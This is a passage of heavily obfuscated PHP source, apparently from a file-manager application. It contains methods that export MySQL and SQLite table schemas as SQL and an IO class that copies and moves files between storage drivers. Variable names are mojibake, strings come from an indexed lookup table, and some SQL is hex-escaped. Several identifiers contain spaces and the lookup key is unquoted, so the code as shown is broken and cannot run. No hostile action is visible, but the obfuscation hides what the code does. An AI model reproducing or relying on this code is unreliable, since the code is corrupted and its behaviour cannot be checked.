public function dbType($­ËŒÜõ› = false) { $¾Á±Ğğ¡ =& $_SERVER[ùèÅ´Ãš]; $ƒ½ìŒÌ‘ = $­ËŒÜõ› ? $GLOBALS[$¾Á±Ğğ¡[6]][$¾Á±Ğğ¡[21]] : $this->database; $ƒ½ìŒÌ‘ = array_change_key_case($ƒ½ìŒÌ‘); $½Ë—É×† = $ƒ½ìŒÌ‘[$¾Á±Ğğ¡[1055]]; if ($½Ë—É×† == $¾Á±Ğğ¡[1052]) { $ÁÚÑ‚ì = explode($¾Á±Ğğ¡[4], $ƒ½ìŒÌ‘[$¾Á±Ğğ¡[1061]]); $½Ë—É×† = $ÁÚÑ‚ì[0]; } $§Üï…Ë¦ = array($¾Á±Ğğ¡[1185] => $¾Á±Ğğ¡[13], $¾Á±Ğğ¡[1000] => $¾Á±Ğğ¡[886]); if (isset($§Üï…Ë¦[$½Ë—É×†])) { $½Ë—É×† = $§Üï…Ë¦[$½Ë—É×†]; } return $½Ë—É×†; } public function sqlFromMysql($­àŠşöˆ, $ş‘¨ŸŸÌ = '') { $¿¯èá¸ =& $_SERVER[ùèÅ´Ãš]; $ÕÅ°ÌÙœ = $this->model()->db(); $Œ¼â„˜ = $ÕÅ°ÌÙœ->query($¿¯èá¸[1186] . $­àŠşöˆ . $¿¯èá¸[463]); if (!$Œ¼â„˜ || !$Œ¼â„˜[0]) { return !1; } $‹´ìüè¿ = _get($Œ¼â„˜[0], $¿¯èá¸[1187], $¿¯èá¸[12]); if (!$‹´ìüè¿) { return !1; } $Ú×Öö«„ = "\104\122\x4f\x50\x20\124\x41\x42\114\x45\x20\x49\x46\x20\x45\130\x49\123\x54\123\40\x60{$­àŠşöˆ}\140\x3b" . PHP_EOL . $‹´ìüè¿ . $¿¯èá¸[74]; if ($ş‘¨ŸŸÌ && $ş‘¨ŸŸÌ == $¿¯èá¸[886]) { return $Ú×Öö«„; } $™ü¨ßà = array_change_key_case($GLOBALS[$¿¯èá¸[6]][$¿¯èá¸[21]]); $¯¥¹˜» = $™ü¨ßà[$¿¯èá¸[1060]]; $õ–½ñğ› = $¿¯èá¸[1188] . $¯¥¹˜» . $¿¯èá¸[1189] . $­àŠşöˆ . $¿¯èá¸[58]; $¨ôØå³ = $¿¯èá¸[1190] . $­àŠşöˆ . $¿¯èá¸[988]; $›çĞ…ëµ = $ÕÅ°ÌÙœ->query($õ–½ñğ›); if (empty($›çĞ…ëµ)) { $Ô ¤æ¬¨ = array($¿¯èá¸[886] => $¿¯èá¸[12], $¿¯èá¸[13] => $¿¯èá¸[12]); return $ş‘¨ŸŸÌ ? $Ô ¤æ¬¨[$ş‘¨ŸŸÌ] : $Ô ¤æ¬¨; } $¦ñ†İÃ¯ = $ÕÅ°ÌÙœ->query($¨ôØå³); $²’Ì‚¦® = $¿¯èá¸[12]; $¨‹¢—Šë = array(); foreach ($¦ñ†İÃ¯ as $ƒÏ«ìÎÈ) { if (!$²’Ì‚¦® && $ƒÏ«ìÎÈ[$¿¯èá¸[1191]] == $¿¯èá¸[1192]) { $²’Ì‚¦® = $ƒÏ«ìÎÈ[$¿¯èá¸[1193]]; } if (isset($¨‹¢—Šë[$ƒÏ«ìÎÈ[$¿¯èá¸[1191]]])) { $¨‹¢—Šë[$ƒÏ«ìÎÈ[$¿¯èá¸[1191]]][$¿¯èá¸[1194]][] = $ƒÏ«ìÎÈ[$¿¯èá¸[1193]]; continue; } $¨‹¢—Šë[$ƒÏ«ìÎÈ[$¿¯èá¸[1191]]] = array($¿¯èá¸[1195] => $ƒÏ«ìÎÈ[$¿¯èá¸[1191]], $¿¯èá¸[1194] => array($ƒÏ«ìÎÈ[$¿¯èá¸[1193]]), $¿¯èá¸[1196] => $ƒÏ«ìÎÈ[$¿¯èá¸[1197]] == $¿¯èá¸[91] ? 0 : 1); } $ı¢Æ×ØŠ = array(); foreach ($¨‹¢—Šë as $ƒÏ«ìÎÈ) { $ñĞ¼î† = $ƒÏ«ìÎÈ[$¿¯èá¸[1195]] == $¿¯èá¸[1192]; $¡º¿ ÷ = array($¿¯èá¸[1198], $ƒÏ«ìÎÈ[$¿¯èá¸[1196]] == $¿¯èá¸[91] && !$ñĞ¼î† ? $¿¯èá¸[1199] : $¿¯èá¸[12], $¿¯èá¸[1200], $¿¯èá¸[1201] . $­àŠşöˆ . $¿¯èá¸[11] . ($ñĞ¼î† ? $¿¯èá¸[1202] : $ƒÏ«ìÎÈ[$¿¯èá¸[1195]]) . $¿¯èá¸[121], $¿¯èá¸[1203], $¿¯èá¸[121] . $­àŠşöˆ . $¿¯èá¸[121], $¿¯èá¸[1204] . implode($¿¯èá¸[1205], $ƒÏ«ìÎÈ[$¿¯èá¸[1194]]) . $¿¯èá¸[1206]); $ı¢Æ×ØŠ[] = implode($¿¯èá¸[53], $¡º¿ ÷) . $¿¯èá¸[74]; } $×Ï¥—ÁË = array(); $ú°Ìß³ô = array($¿¯èá¸[1207] => $¿¯èá¸[1208], $¿¯èá¸[1208] => $¿¯èá¸[1208], $¿¯èá¸[366] => $¿¯èá¸[392], $¿¯èá¸[365] => $¿¯èá¸[392]); foreach ($›çĞ…ëµ as $ƒÏ«ìÎÈ) { $¡º¿ ÷ = array($¿¯èá¸[121] . $ƒÏ«ìÎÈ[$¿¯èá¸[1209]] . $¿¯èá¸[121], isset($ú°Ìß³ô[$ƒÏ«ìÎÈ[$¿¯èá¸[1210]]]) ? $ú°Ìß³ô[$ƒÏ«ìÎÈ[$¿¯èá¸[1210]]] : $ƒÏ«ìÎÈ[$¿¯èá¸[1211]], $ƒÏ«ìÎÈ[$¿¯èá¸[1212]] == $¿¯èá¸[986] ? $¿¯èá¸[1213] : $¿¯èá¸[1214], $ƒÏ«ìÎÈ[$¿¯èá¸[1209]] == $²’Ì‚¦® ? $¿¯èá¸[1215] : $¿¯èá¸[12], $ƒÏ«ìÎÈ[$¿¯èá¸[1037]] ? strtoupper(str_replace($¿¯èá¸[11], $¿¯èá¸[12], $ƒÏ«ìÎÈ[$¿¯èá¸[1037]])) : $¿¯èá¸[12]); $×Ï¥—ÁË[] = trim(implode($¿¯èá¸[53], $¡º¿ ÷)); } $Şİ¾öÖ = array($¿¯èá¸[1216] . $­àŠşöˆ . $¿¯èá¸[1217], $¿¯èá¸[1218] . $­àŠşöˆ . $¿¯èá¸[1219], implode($¿¯èá¸[50] . PHP_EOL, $×Ï¥—ÁË), $¿¯èá¸[1034]); $Îè‰šì“ = implode(PHP_EOL, array_merge($Şİ¾öÖ, $ı¢Æ×ØŠ)); if ($ş‘¨ŸŸÌ && $ş‘¨ŸŸÌ == $¿¯èá¸[13]) { return $Îè‰šì“; } $Ô ¤æ¬¨ = array($¿¯èá¸[886] => $Ú×Öö«„, $¿¯èá¸[13] => $Îè‰šì“); return $ş‘¨ŸŸÌ ? $Ô ¤æ¬¨[$ş‘¨ŸŸÌ] : $Ô ¤æ¬¨; } public function sqlFromSqlite($²ÏóˆÍ”, $”çàÑÔ = '') { $·€Ë˜ˆ¸ =& $_SERVER[ùèÅ´Ãš]; $ĞåéÊÈú = $this->model()->db(); $èõÛ¬ß™ = "\x50\x52\x41\107\115\x41\x20\124\x41\102\114\x45\137\x49\x4e\x46\117\40\x28\47{$²ÏóˆÍ”}\47\51"; $ÃÆåŒš = "\x53\105\114\x45\103\124\x20\52\40\106\x52\x4f\x4d\40\163\x71\x6c\x69\x74\x65\137\x6d\141\163\164\x65\x72\x20\x57\x48\x45\122\x45\x20\x74\x62\154\x5f\x6e\141\155\145\40\75\x20\47{$²ÏóˆÍ”}\47"; $ú÷÷¶Õ´ = $ĞåéÊÈú->query($èõÛ¬ß™); if (empty($ú÷÷¶Õ´)) { $øè›«şÎ = array($·€Ë˜ˆ¸[886] => $·€Ë˜ˆ¸[12], $·€Ë˜ˆ¸[13] => $·€Ë˜ˆ¸[12]); return $”çàÑÔ ? $øè›«şÎ[$”çàÑÔ] : $øè›«şÎ; } $å¬­°á­ = $ĞåéÊÈú->query($ÃÆåŒš); $ó’ˆŸà¸ = $¿»½›¼® = array(); foreach ($å¬­°á­ as $ñÍÉŠĞ¤) { if ($ñÍÉŠĞ¤[$·€Ë˜ˆ¸[33]] == $·€Ë˜ˆ¸[359]) { $ó’ˆŸà¸[] = $ñÍÉŠĞ¤[$·€Ë˜ˆ¸[1220]]; } else { $¿»½›¼®[$ñÍÉŠĞ¤[$·€Ë˜ˆ¸[32]]] = $ñÍÉŠĞ¤[$·€Ë˜ˆ¸[1220]]; } } $ïÁâÉà = array_merge(array($·€Ë˜ˆ¸[1216] . $²ÏóˆÍ” . $·€Ë˜ˆ¸[121]), $ó’ˆŸà¸, array_values($¿»½›¼®)); $ïÁâÉà = implode($·€Ë˜ˆ¸[74] . PHP_EOL, $ïÁâÉà) . $·€Ë˜ˆ¸[74]; if ($”çàÑÔ && $”çàÑÔ == $·€Ë˜ˆ¸[13]) { return $ïÁâÉà; } $®¿Î³–¡ = array(); foreach ($¿»½›¼® as $™ÈÈë±± => $¸£ƒâºõ) { $ãÔã¦Â” = str_replace($·€Ë˜ˆ¸[1221] . $²ÏóˆÍ” . $·€Ë˜ˆ¸[11], $·€Ë˜ˆ¸[12], $™ÈÈë±±); $ãÔã¦Â” = str_replace($²ÏóˆÍ” . $·€Ë˜ˆ¸[11], $·€Ë˜ˆ¸[12], $™ÈÈë±±); $»†ã…¾º = str_replace(array($·€Ë˜ˆ¸[121], $·€Ë˜ˆ¸[1045]), $·€Ë˜ˆ¸[463], substr($¸£ƒâºõ, stripos($¸£ƒâºõ, $·€Ë˜ˆ¸[340]))); $®¿Î³–¡[$ãÔã¦Â”] = $»†ã…¾º; } $”ïÁÎÅö = array(); $¬²„©› = array($·€Ë˜ˆ¸[1208] => $·€Ë˜ˆ¸[1222], $·€Ë˜ˆ¸[392] => $·€Ë˜ˆ¸[1223]); $¤—ó³£… = $Áøòò¿‹ = $·€Ë˜ˆ¸[12]; foreach ($ú÷÷¶Õ´ as $ñÍÉŠĞ¤) { if ($ñÍÉŠĞ¤[$·€Ë˜ˆ¸[57]] == $·€Ë˜ˆ¸[91]) { $¤—ó³£… = $ñÍÉŠĞ¤[$·€Ë˜ˆ¸[32]]; } $„ö»‘äµ = $ñÍÉŠĞ¤[$·€Ë˜ˆ¸[33]]; if ($„ö»‘äµ == $·€Ë˜ˆ¸[1224] && isset($®¿Î³–¡[$ñÍÉŠĞ¤[$·€Ë˜ˆ¸[32]]])) { $„ö»‘äµ = $·€Ë˜ˆ¸[1225]; } $ãéç·Œ = array($·€Ë˜ˆ¸[463] . $ñÍÉŠĞ¤[$·€Ë˜ˆ¸[32]] . $·€Ë˜ˆ¸[463], _get($¬²„©›, $„ö»‘äµ, $„ö»‘äµ), $ñÍÉŠĞ¤[$·€Ë˜ˆ¸[35]] == $·€Ë˜ˆ¸[91] ? $·€Ë˜ˆ¸[1213] : $·€Ë˜ˆ¸[1226] . $ñÍÉŠĞ¤[$·€Ë˜ˆ¸[56]], $ñÍÉŠĞ¤[$·€Ë˜ˆ¸[57]] == $·€Ë˜ˆ¸[91] ? $·€Ë˜ˆ¸[1227] : $·€Ë˜ˆ¸[12]); $”ïÁÎÅö[] = trim(implode($·€Ë˜ˆ¸[53], $ãéç·Œ)); } foreach ($®¿Î³–¡ as $ãÔã¦Â” => $»†ã…¾º) { if ($ãÔã¦Â” == $·€Ë˜ˆ¸[1202]) { $´œ°¬—ş = $Áøòò¿‹ = $·€Ë˜ˆ¸[1228] . $¤—ó³£… . $·€Ë˜ˆ¸[1229]; } else { $´œ°¬—ş = (stripos($ãÔã¦Â”, $·€Ë˜ˆ¸[11]) ? $·€Ë˜ˆ¸[1230] : $·€Ë˜ˆ¸[12]) . ($·€Ë˜ˆ¸[1231] . $ãÔã¦Â” . $·€Ë˜ˆ¸[1232] . $»†ã…¾º); } $”ïÁÎÅö[] = $´œ°¬—ş; } if ($¤—ó³£… && !$Áøòò¿‹) { $”ïÁÎÅö = array_merge(array($·€Ë˜ˆ¸[1228] . $¤—ó³£… . $·€Ë˜ˆ¸[1229]), $”ïÁÎÅö); } $úÑü”˜Ò = array($·€Ë˜ˆ¸[1233] . $²ÏóˆÍ” . $·€Ë˜ˆ¸[1234], $·€Ë˜ˆ¸[1235] . $²ÏóˆÍ” . $·€Ë˜ˆ¸[1236], implode($·€Ë˜ˆ¸[50] . PHP_EOL, $”ïÁÎÅö), $·€Ë˜ˆ¸[1237]); $„·—…¾„ = implode(PHP_EOL, $úÑü”˜Ò); if ($”çàÑÔ && $”çàÑÔ == $·€Ë˜ˆ¸[886]) { return $„·—…¾„; } $øè›«şÎ = array($·€Ë˜ˆ¸[886] => $„·—…¾„, $·€Ë˜ˆ¸[13] => $ïÁâÉà); return $”çàÑÔ ? $øè›«şÎ[$”çàÑÔ] : $øè›«şÎ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($õ÷‰¨‹ı, $‰ûĞì‡Ú) { $³á³ß‰Ñ =& $_SERVER[ùèÅ´Ãš]; $˜Çİ¹˜ê = $‰ûĞì‡Ú; $GLOBALS[$³á³ß‰Ñ[1238]] = $³á³ß‰Ñ[1239] . $õ÷‰¨‹ı; Hook::trigger($³á³ß‰Ñ[1239] . $õ÷‰¨‹ı . $³á³ß‰Ñ[1240], $˜Çİ¹˜ê); $˜©¡€üÓ = self::driverMake($‰ûĞì‡Ú[0]); if (!$˜©¡€üÓ) { return !1; } if ($õ÷‰¨‹ı == $³á³ß‰Ñ[625] || $õ÷‰¨‹ı == $³á³ß‰Ñ[627] || $õ÷‰¨‹ı == $³á³ß‰Ñ[1241]) { if (!trim($˜©¡€üÓ->path . $³á³ß‰Ñ[456], $³á³ß‰Ñ[8])) { return !1; } } if (method_exists($˜©¡€üÓ, $õ÷‰¨‹ı)) { $ãäß‹ç = @call_user_func_array(array($˜©¡€üÓ, $õ÷‰¨‹ı), $‰ûĞì‡Ú); } else { if (method_exists($˜©¡€üÓ, $³á³ß‰Ñ[1242])) { $ãäß‹ç = @call_user_func_array(array($˜©¡€üÓ, $õ÷‰¨‹ı), $‰ûĞì‡Ú); } else { if (method_exists(self, $õ÷‰¨‹ı)) { $ãäß‹ç = @call_user_func_array(array(self, $õ÷‰¨‹ı), $‰ûĞì‡Ú); } else { $ãäß‹ç = call_user_func_array(array(parent, $õ÷‰¨‹ı), $‰ûĞì‡Ú); } } } Hook::trigger($³á³ß‰Ñ[1239] . $õ÷‰¨‹ı . $³á³ß‰Ñ[1243], $˜Çİ¹˜ê, $ãäß‹ç); return $ãäß‹ç; } public static function init($Àï†¦ëé) { return self::driverMake($Àï†¦ëé); } public static function copy($ÔÀ¾ŠÀ¹, $¼Â¢á–, $ÉìÒ¤ä = false, $­×³Æ½Õ = false) { return self::copyMoveStart($ÔÀ¾ŠÀ¹, $¼Â¢á–, $ÉìÒ¤ä, $_SERVER[ùèÅ´Ãš][625], $­×³Æ½Õ); } public static function move($™ª‡æù, $ªÏ¨Ö³ş, $¥µ¯‚ê = false, $Î™Êõ = false) { return self::copyMoveStart($™ª‡æù, $ªÏ¨Ö³ş, $¥µ¯‚ê, $_SERVER[ùèÅ´Ãš][627], $Î™Êõ); } public static function copyMoveChildren($‘ç‚Ÿôğ, $ßæÚ¸–«, $¬ğÈ™Ä = "\143\157\x70\171", $Ö‹«ÜëÃ = REPEAT_REPLACE) { $ú¶¯ÒÎ =& $_SERVER[ùèÅ´Ãš]; $âÖÆ’‹ = $‘ç‚Ÿôğ; $Š´¯øæ = self::driverMake($‘ç‚Ÿôğ); $âèöööà = $Š´¯øæ->listPath($‘ç‚Ÿôğ, !0); $ãıü÷¹¼ = array_merge($âèöööà[$ú¶¯ÒÎ[86]], $âèöööà[$ú¶¯ÒÎ[85]]); foreach ($ãıü÷¹¼ as $ĞÑ³Õ÷Ÿ) { self::copyMoveStart($ĞÑ³Õ÷Ÿ[$ú¶¯ÒÎ[87]], $ßæÚ¸–«, $Ö‹«ÜëÃ, $¬ğÈ™Ä, !1); } if ($¬ğÈ™Ä == $ú¶¯ÒÎ[627]) { self::remove($âÖÆ’‹); } } private static function copyMoveStart($İó‘¾Ç, $¯ÓÀ“’±, $¸¯Š–íÓ, $Îû§€ó¥, $Á£ÆŸğ´) { $»…ÇÒŸ• =& $_SERVER[ùèÅ´Ãš]; $Ó¨ªºøµ = array($İó‘¾Ç, $¯ÓÀ“’±, $¸¯Š–íÓ, $Á£ÆŸğ´); Hook::trigger($»…ÇÒŸ•[1239] . $Îû§€ó¥ . $»…ÇÒŸ•[1240], $Ó¨ªºøµ); $—Íú±¢È = self::copyMove($İó‘¾Ç, $¯ÓÀ“’±, $¸¯Š–íÓ, $Îû§€ó¥, $Á£ÆŸğ´); Hook::trigger($»…ÇÒŸ•[1239] . $Îû§€ó¥ . $»…ÇÒŸ•[1243], $Ó¨ªºøµ, $—Íú±¢È); return $—Íú±¢È; } public static function saveFile($úó„õ„÷, $¨°†ÁÙÓ, $ˆ•†ƒ = true) { $£šˆµ¶ì =& $_SERVER[ùèÅ´Ãš]; $úÖØÀ±š = self::info($¨°†ÁÙÓ); $”˜¤©óÆ = self::driverMake($úó„õ„÷); $˜ÇéÓÕ¸ = self::driverMake($¨°†ÁÙÓ); $¢—ƒÕîÕ = !1; if ($˜ÇéÓÕ¸->pathParse[$£šˆµ¶ì[1244]]) { $¢—ƒÕîÕ = $˜ÇéÓÕ¸; $ÜñÛËı± = $˜ÇéÓÕ¸->pathParse[$£šˆµ¶ì[1244]]; $˜ÇéÓÕ¸ = self::driverMake($ÜñÛËı±); } if ($”˜¤©óÆ->pathParse[$£šˆµ¶ì[1244]]) { $È•œ´íø = $”˜¤©óÆ->pathParse[$£šˆµ¶ì[1244]]; $”˜¤©óÆ = self::driverMake($È•œ´íø); } $õ¶‰Ã¢Ì = $˜ÇéÓÕ¸->pathFather($¨°†ÁÙÓ); $î·¯Ññ  = !0; if (!$ˆ•†ƒ && self::driverIsSame($”˜¤©óÆ, $˜ÇéÓÕ¸)) { $î·¯Ññ  = !1; } $¿Õ×²÷¡ = self::copyFile($”˜¤©óÆ, $úó„õ„÷, $˜ÇéÓÕ¸, $õ¶‰Ã¢Ì, $úÖØÀ±š[$£šˆµ¶ì[32]], $î·¯Ññ ); if ($¢—ƒÕîÕ) { $¿Õ×²÷¡ = $¢—ƒÕîÕ->getPathOuter($¿Õ×²÷¡); } return $¿Õ×²÷¡; } private static function copyMove($¾ö¨¹­, $˜ªºÜë¬, $ú‰Û«µü, $‹àª ö, $‘ƒ³•² = false) { $„€øŸ®ğ =& $_SERVER[ùèÅ´Ãš]; if (!$¾ö¨¹­ || $¾ö¨¹­ == $„€øŸ®ğ[8] || !$˜ªºÜë¬) { return !1; } ignore_timeout(); $§ñ×Š¦± = self::driverMake($¾ö¨¹­); $àÀÁ˜í› = self::driverMake($˜ªºÜë¬); $ÓÇ—®¹Ã = $‹àª ö == $„€øŸ®ğ[627]; $Êö’¦ğ¿ = !1; if ($àÀÁ˜í›->pathParse[$„€øŸ®ğ[1244]]) { $Êö’¦ğ¿ = $àÀÁ˜í›; $˜ªºÜë¬ = $àÀÁ˜í›->pathParse[$„€øŸ®ğ[1244]]; $àÀÁ˜í› = self::driverMake($˜ªºÜë¬); } if ($§ñ×Š¦±->pathParse[$„€øŸ®ğ[1244]]) { $¾ö¨¹­ = $§ñ×Š¦±->pathParse[$„€øŸ®ğ[1244]]; $§ñ×Š¦± = self::driverMake($¾ö¨¹­); } self::check($§ñ×Š¦±, $¾ö¨¹­, $àÀÁ˜í›, $˜ªºÜë¬); Hook::trigger($„€øŸ®ğ[1245], $§ñ×Š¦±, $¾ö¨¹­, $àÀÁ˜í›, $˜ªºÜë¬); $«ö«ˆû = self::driverIsSame($§ñ×Š¦±, $àÀÁ˜í›); if ($«ö«ˆû) { if ($‹àª ö == $„€øŸ®ğ[627] && !method_exists($àÀÁ˜í›, $„€øŸ®ğ[1246]) && trim($˜ªºÜë¬, $„€øŸ®ğ[8]) == trim($àÀÁ˜í›->pathFather($¾ö¨¹­), $„€øŸ®ğ[8])) { if ($§ñ×Š¦±->pathThis($¾ö¨¹­) != $‘ƒ³•² && !$§ñ×Š¦±->isOsDriver()) { return $§ñ×Š¦±->rename($¾ö¨¹­, $‘ƒ³•²); } return $àÀÁ˜í›->getPathOuter($¾ö¨¹­); } if (method_exists($àÀÁ˜í›, $‹àª ö)) { return $àÀÁ˜í›->{$‹àª ö}($¾ö¨¹­, $˜ªºÜë¬, $ú‰Û«µü, $‘ƒ³•²); } } if ($«ö«ˆû && $‹àª ö == $„€øŸ®ğ[627] && $àÀÁ˜í›->getType() == $„€øŸ®ğ[109]) { $É—Î«€Õ = $àÀÁ˜í›->movePath($¾ö¨¹­, $˜ªºÜë¬, $‘ƒ³•²); if ($É—Î«€Õ) { return $É—Î«€Õ; } } $ïÃÎûŠó = $§ñ×Š¦±->isFile($¾ö¨¹­); if (!$ïÃÎûŠó && $àÀÁ˜í›->getType() == $„€øŸ®ğ[835] && $§ñ×Š¦±->getType() == $„€øŸ®ğ[109]) { $É—Î«€Õ = $àÀÁ˜í›->copyFolderFromIO($§ñ×Š¦±, $¾ö¨¹­, $˜ªºÜë¬, $ú‰Û«µü, $ÓÇ—®¹Ã, $‘ƒ³•²); } else { $É—Î«€Õ = self::copyPath($§ñ×Š¦±, $¾ö¨¹­, $àÀÁ˜í›, $˜ªºÜë¬, $ú‰Û«µü, $ÓÇ—®¹Ã, $ïÃÎûŠó, $‘ƒ³•²); } if ($É—Î«€Õ && $ÓÇ—®¹Ã) { $§ñ×Š¦±->remove($¾ö¨¹­); } if ($Êö’¦ğ¿) { $É—Î«€Õ = $Êö’¦ğ¿->getPathOuter($É—Î«€Õ); } return $É—Î«€Õ; } private static function check($Óˆìñº, $ƒ¯®î†á, $‰Ø¢ä§¥, &$È®ŠæøÈ) { $÷ Ï©¢ =& $_SERVER[ùèÅ´Ãš]; if (self::driverIsSame($Óˆìñº, $‰Ø¢ä§¥) && $Óˆìñº->isFolder($ƒ¯®î†á) && $Óˆìñº->isParentOf($ƒ¯®î†á, $È®ŠæøÈ)) { show_json(LNG($÷ Ï©¢[1247]), !1); } if (!$Óˆìñº->exist($ƒ¯®î†á)) { show_json(LNG($÷ Ï©¢[108]), !1); } } private static function copyPath($ªÜ„û–…, $ı÷ˆşû, $æÈ¶ï”, $Á»íºĞ, $ª¨ÔÂÁ¹, $àØ, $Ì ®ÇÛè, $ü¸‘¹˜ = false, $¹ËùïÏá = true) { $È…­ñéâ =& $_SERVER[ùèÅ´Ãš]; $Ù¤­¤ê» = empty($ü¸‘¹˜) && $ü¸‘¹˜ !== $È…­ñéâ[231] ? $ªÜ„û–…->pathThis($ı÷ˆşû) : $ü¸‘¹˜; if ($ª¨ÔÂÁ¹) { $×à¤û½ = $æÈ¶ï”->fileNameExist($Á»íºĞ, $Ù¤­¤ê»); $°˜ı‹¨­ = $Ù¤­¤ê»; $Ù¤­¤ê» = $æÈ¶ï”->fileNameAuto($Á»íºĞ, $Ù¤­¤ê», $ª¨ÔÂÁ¹, !$Ì ®ÇÛè); if (!$×à¤û½ || $°˜ı‹¨­ != $Ù¤­¤ê») { $ª¨ÔÂÁ¹ = !1; } if ($¹ËùïÏá && !$ª¨ÔÂÁ¹) { $æÈ¶ï”->_data[$È…­ñéâ[1248]] = !0; } } if ($Ì ®ÇÛè) { return self::copyFile($ªÜ„û–…, $ı÷ˆşû, $æÈ¶ï”, $Á»íºĞ, $Ù¤­¤ê», $àØ); } if ($ª¨ÔÂÁ¹ == REPEAT_RENAME_FOLDER) { $ª¨ÔÂÁ¹ = !1; } $¬»¡ÇöË = rtrim($Á»íºĞ, $È…­ñéâ[8]) . $È…­ñéâ[8] . $Ù¤­¤ê»; $Æ¥ˆÉ¿é = $æÈ¶ï”->mkdir($æÈ¶ï”->getPath($¬»¡ÇöË), $ª¨ÔÂÁ¹); $Á»íºĞ = $æÈ¶ï”->getPathInner($Æ¥ˆÉ¿é); $îœ€î‘ˆ = $ªÜ„û–…->listPath($ı÷ˆşû, !0); $îœ€î‘ˆ = is_array($îœ€î‘ˆ) ? $îœ€î‘ˆ : array($È…­ñéâ[86] => array(), $È…­ñéâ[85] => array()); $ëÚÅ˜ñ = array_merge($îœ€î‘ˆ[$È…­ñéâ[86]], $îœ€î‘ˆ[$È…­ñéâ[85]]); foreach ($ëÚÅ˜ñ as $ªªåîÆÇ) { $úÍâÎ¨Ú = $ªªåîÆÇ[$È…­ñéâ[33]] == $È…­ñéâ[233]; $ı÷ˆşû = $ªÜ„û–…->getPathInner($ªªåîÆÇ[$È…­ñéâ[87]]); $àÓ³æ = self::copyPath($ªÜ„û–…, $ı÷ˆşû, $æÈ¶ï”, $Á»íºĞ, $ª¨ÔÂÁ¹, $àØ, $úÍâÎ¨Ú, !1, !1); if (!$àÓ³æ) { IO::errorTips($È…­ñéâ[1249] . $ı÷ˆşû . $È…­ñéâ[73] . $Á»íºĞ); } } self::copyMoveKeepInfo($ªÜ„û–…, $ı÷ˆşû, $Æ¥ˆÉ¿é); return $Æ¥ˆÉ¿é; } private static function copyFile($Ú¦ã³Áó, $â¿­‹˜¿, $¿è¦îš„, $›ñ¬¦³, $ï½ø¼, $Áˆø´§) { $ºÛÈ³Ü¸ =& $_SERVER[ùèÅ´Ãš]; $›ñ¬¦³ = $¿è¦îš„->getPath(rtrim($›ñ¬¦³, $ºÛÈ³Ü¸[8]) . $ºÛÈ³Ü¸[8] . $ï½ø¼); $î¤ë×¬ = $ºÛÈ³Ü¸[1250] . time() . rand_string(5); Hook::trigger($ºÛÈ³Ü¸[1251], $Ú¦ã³Áó, $â¿­‹˜¿, $¿è¦îš„, $›ñ¬¦³, $ï½ø¼, $î¤ë×¬); if (self::driverIsSame($Ú¦ã³Áó, $¿è¦îš„)) { if ($Áˆø´§) { $–ú€Ë¬» = $¿è¦îš„->moveFile($â¿­‹˜¿, $›ñ¬¦³); } else { $–ú€Ë¬» = $¿è¦îš„->copyFile($â¿­‹˜¿, $›ñ¬¦³); } Hook::trigger($ºÛÈ³Ü¸[1252], $Ú¦ã³Áó, $â¿­‹˜¿, $¿è¦îš„, $›ñ¬¦³, $ï½ø¼, $–ú€Ë¬»); self::copyMoveKeepInfo($Ú¦ã³Áó, $â¿­‹˜¿, $–ú€Ë¬»); return $–ú€Ë¬»; } $†µœ‚É‰ = TEMP_FILES; if ($GLOBALS[$ºÛÈ³Ü¸[6]][$ºÛÈ³Ü¸[92]][$ºÛÈ³Ü¸[876]]) { $†µœ‚É‰ = $GLOBALS[$ºÛÈ³Ü¸[6]][$ºÛÈ³Ü¸[92]][$ºÛÈ³Ü¸[876]]; } $ï³‡ÃÌ = $†µœ‚É‰; mk_dir($ï³‡ÃÌ); $Âë ¥× = $ï³‡ÃÌ . $î¤ë×¬; $­‰£ˆ®ç = $Âë ¥×; $Âë ¥× = $Ú¦ã³Áó->download($â¿­‹˜¿, $Âë ¥×); $Âë ¥× = $Ú¦ã³Áó->iconvApp($Âë ¥×); if (substr($Âë ¥×, strlen($†µœ‚É‰)) == $†µœ‚É‰) { $Áˆø´§ = !0; } $–ú€Ë¬» = $¿è¦îš„->upload($›ñ¬¦³, $Âë ¥×, $Áˆø´§); self::remove($­‰£ˆ®ç); Hook::trigger($ºÛÈ³Ü¸[1252], $Ú¦ã³Áó, $â¿­‹˜¿, $¿è¦îš„, $›ñ¬¦³, $ï½ø¼, $–ú€Ë¬»); self::copyMoveKeepInfo($Ú¦ã³Áó, $â¿­‹˜¿, $–ú€Ë¬»); return $–ú€Ë¬»; } private static function copyMoveKeepInfo($ö†õ²á, $¼ºÒÊşÕ, $¡çÎÏÇ) { if (!$¡çÎÏÇ) { return; } $‹…Şóş = $ö†õ²á->info($¼ºÒÊşÕ); if (!is_array($‹…Şóş)) { return; } IO::setModifyTime($¡çÎÏÇ, $‹…Şóş[$_SERVER[ùèÅ´Ãš][88]]); } public static function pathFather($ÆöüÚšŞ) { $¨ş³ÛËº = IO::init($ÆöüÚšŞ); $Ã±óÆ“Ü = $¨ş³ÛËº->pathFather($¨ş³ÛËº->path); return $¨ş³ÛËº->getPathOuter($Ã±óÆ“Ü); } public static function fileOut($“Ä§ıòœ, $Éøø‡•š = false, $œæó¨ç´ = false, $Äæâ§‰³ = '') { $’½ì¦çÃ = self::driverMake($“Ä§ıòœ); if ($’½ì¦çÃ->isFileOutServer()) { return $’½ì¦çÃ->fileOutServer($“Ä§ıòœ, $Éøø‡•š, $œæó¨ç´, $Äæâ§‰³); } return $’½ì¦çÃ->fileOut($“Ä§ıòœ, $Éøø‡•š, $œæó¨ç´, $Äæâ§‰³); } public static function fileOutImage($ôşëìÓ, $Äœ¬¶»¦ = 250) { $¶–“©ñ° = array(250, 600, 1200, 2000, 3000, 5000); for ($Ó’¤¯ø• = 0; $Ó’¤¯ø• < count($¶–“©ñ°); $Ó’¤¯ø•++) { if ($Ó’¤¯ø• == 0 && $Äœ¬¶»¦ <= $¶–“©ñ°[$Ó’¤¯ø•]) { $Äœ¬¶»¦ = $¶–“©ñ°[$Ó’¤¯ø•]; break; } else { if ($Äœ¬¶»¦ > $¶–“©ñ°[$Ó’¤¯ø• - 1] && $Äœ¬¶»¦ <= $¶–“©ñ°[$Ó’¤¯ø•]) { $Äœ¬¶»¦ = $¶–“©ñ°[$Ó’¤¯ø•]; break; } else { if ($Ó’¤¯ø• == count($¶–“©ñ°) - 1 && $Äœ¬¶»¦ > $¶–“©ñ°[$Ó’¤¯ø•]) { $Äœ¬¶»¦ = $¶–“©ñ°[$Ó’¤¯ø•]; break; } } } } $ÈÈİƒüÇ = self::driverMake($ôşëìÓ); if 